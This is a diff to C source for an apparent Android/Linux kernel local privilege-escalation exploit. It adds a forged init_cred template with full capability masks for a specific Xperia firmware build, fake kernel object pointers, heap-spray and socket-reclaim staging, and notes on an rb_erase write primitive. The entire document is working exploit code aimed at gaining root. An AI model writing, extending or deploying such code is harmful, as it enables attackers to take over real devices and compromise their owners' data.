@@ -6,6 +6,11 @@ static struct kernelsnitch_shared_state *ks;
 static size_t mm_objs_per_slab;
 static unsigned char *skb_buf;
 static int reclaim_sv[2] = {-1, -1};
+static int quarantined_reclaim_sv[2] = {-1, -1};
+static int prebuilt_reclaim_sv[2] = {-1, -1};
+static uintptr_t prebuilt_page_base, prebuilt_fake_lock, prebuilt_fake_w0;
+static uintptr_t prebuilt_fake_task, prebuilt_fake_parent, prebuilt_fake_right;
+static uintptr_t prebuilt_fake_left, prebuilt_fake_fops;
 static struct mm_ctx prepare_ctx;
 static struct mm_ctx spray_ctx;
 static struct mm_ctx pre_ctx;
@@ -206,13 +211,20 @@ void put32(unsigned char *p, size_t off, uint32_t value) {
 
 static void fill_init_cred_copy(unsigned char *p, size_t off) {
   unsigned char *c = p + off;
-  memset(c, 0, 136);
-  put32(c, 0, 1);
-  put64(c, 48, 0xFFFFFFFFFFFFFFFFULL);
-  put64(c, 56, 0xFFFFFFFFFFFFFFFFULL);
-  put64(c, 64, 0xFFFFFFFFFFFFFFFFULL);
-  put64(c, 72, 0xFFFFFFFFFFFFFFFFULL);
-  put64(c, 80, 0xFFFFFFFFFFFFFFFFULL);
+  /* Exact 0xb0-byte init_cred template from Xperia 67.2.A.3.178. Static
+   * pointer members remain valid through the kernel image mapping. Only the
+   * usage count is raised because the socket-backed copy must stay pinned. */
+  memset(c, 0, 0xb0);
+  put32(c, 0x00, 0x100);
+  put64(c, 0x30, 0x000001ffffffffffULL);
+  put64(c, 0x38, 0x000001ffffffffffULL);
+  put64(c, 0x40, 0x000001ffffffffffULL);
+  /* Runtime KASLR relocates these four canonical image pointers in the real
+   * init_cred. Resolve equivalent direct-map aliases from their image VAs. */
+  put64(c, 0x80, data_addr(0xffffffc00ab23a80ULL));
+  put64(c, 0x88, data_addr(0xffffffc00acce110ULL));
+  put64(c, 0x90, data_addr(0xffffffc00ab23ff0ULL));
+  put64(c, 0x98, data_addr(0xffffffc00ab23b28ULL));
 }
 
 pid_t clone_child(void) {
@@ -258,6 +270,70 @@ void close_reclaim_sockets(void) {
     if (reclaim_sv[i] >= 0) {
       close(reclaim_sv[i]);
       reclaim_sv[i] = -1;
+    }
+  }
+}
+
+int quarantine_reclaim_sockets(void) {
+  if (quarantined_reclaim_sv[0] >= 0 || quarantined_reclaim_sv[1] >= 0)
+    return 0;
+  if (reclaim_sv[0] < 0 || reclaim_sv[1] < 0)
+    return 0;
+  quarantined_reclaim_sv[0] = reclaim_sv[0];
+  quarantined_reclaim_sv[1] = reclaim_sv[1];
+  reclaim_sv[0] = reclaim_sv[1] = -1;
+  return 1;
+}
+
+void release_quarantined_reclaim_sockets(void) {
+  for (int i = 0; i < 2; i++) {
+    if (quarantined_reclaim_sv[i] >= 0) {
+      close(quarantined_reclaim_sv[i]);
+      quarantined_reclaim_sv[i] = -1;
+    }
+  }
+}
+
+int stash_prebuilt_page(void) {
+  if (prebuilt_reclaim_sv[0] >= 0 || reclaim_sv[0] < 0)
+    return 0;
+  prebuilt_reclaim_sv[0] = reclaim_sv[0];
+  prebuilt_reclaim_sv[1] = reclaim_sv[1];
+  reclaim_sv[0] = reclaim_sv[1] = -1;
+  prebuilt_page_base = page_base;
+  prebuilt_fake_lock = fake_lock;
+  prebuilt_fake_w0 = fake_w0;
+  prebuilt_fake_task = fake_task;
+  prebuilt_fake_parent = fake_parent;
+  prebuilt_fake_right = fake_right;
+  prebuilt_fake_left = fake_left;
+  prebuilt_fake_fops = fake_fops;
+  return 1;
+}
+
+int activate_prebuilt_page(void) {
+  if (prebuilt_reclaim_sv[0] < 0)
+    return 0;
+  close_reclaim_sockets();
+  reclaim_sv[0] = prebuilt_reclaim_sv[0];
+  reclaim_sv[1] = prebuilt_reclaim_sv[1];
+  prebuilt_reclaim_sv[0] = prebuilt_reclaim_sv[1] = -1;
+  page_base = prebuilt_page_base;
+  fake_lock = prebuilt_fake_lock;
+  fake_w0 = prebuilt_fake_w0;
+  fake_task = prebuilt_fake_task;
+  fake_parent = prebuilt_fake_parent;
+  fake_right = prebuilt_fake_right;
+  fake_left = prebuilt_fake_left;
+  fake_fops = prebuilt_fake_fops;
+  return 1;
+}
+
+void discard_prebuilt_page(void) {
+  for (int i = 0; i < 2; i++) {
+    if (prebuilt_reclaim_sv[i] >= 0) {
+      close(prebuilt_reclaim_sv[i]);
+      prebuilt_reclaim_sv[i] = -1;
     }
   }
 }
@@ -338,10 +414,11 @@ int prepare_skb_payload(uintptr_t base) {
   if (pselect_custom_write) {
     if (pselect_child_node) {
       if (pselect_custom_write == 2) {
-        /* W2 uses init_cred; resolve it from the selected device entry. */
         fake_right = data_addr(g_init_cred_image);
       } else {
-        /* W1 targets the initialized page at base+0x100. */
+        /* The compact rb_erase primitive also writes dest-8 at child+8.
+         * Keep that side effect in this payload's private scratch slot. The
+         * caller quarantines the reclaim socket until scratch+8 is repaired. */
         fake_right = base + 0x100;
       }
     } else {
@@ -459,7 +536,11 @@ int prepare_skb_payload(uintptr_t base) {
 uintptr_t prepare_kernel_page(void) {
   struct timespec t_spray;
   clock_gettime(CLOCK_MONOTONIC, &t_spray);
+  /* Release every userspace reference from the preceding write before the
+   * context arrays are replaced. Keeping the final post-spray memfd pinned
+   * leaked one mm_struct per stage and progressively poisoned later sprays. */
   close_reclaim_sockets();
+  cleanup_page_prepare_state();
   mm_objs_per_slab = ORDER3_SIZE / mm_struct_sz();
   prepare_ctxs();
 
